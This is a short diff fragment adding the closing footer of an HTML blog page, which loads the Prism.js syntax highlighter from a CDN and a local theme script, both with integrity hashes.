+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.27.0/components/prism-core.min.js" integrity="sha512-LCKPTo0gtJ74zCNMbWw04ltmujpzSR4oW+fgN+Y1YclhM5ZrHCZQAJE4quEodcI/G122sRhSGU2BsSRUZ2Gu3w==" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.27.0/plugins/autoloader/prism-autoloader.min.js" integrity="sha512-GP4x8UWxWyh4BMbyJGOGneiTbkrWEF5izsVJByzVLodP8CuJH/n936+yQDMJJrOPUHLgyPbLiGw2rXmdvGdXHA==" crossorigin="anonymous"></script>
+
+
+
+<script defer src="/blogsite/assets/js/fuji.min.645f1123be695831f419ab54c1bcba327325895c740014006e57070d4f3e5d6b553e929c4b46f40ea707249e9c7f7c2a446d32a39ce7319f80a34525586a8e0f.js" integrity="sha512-ZF8RI75pWDH0GatUwby6MnMliVx0ABQAblcHDU8&#43;XWtVPpKcS0b0DqcHJJ6cf3wqRG0yo5znMZ&#43;Ao0UlWGqODw=="></script>
+
+
+
+</body>
+
+</html>
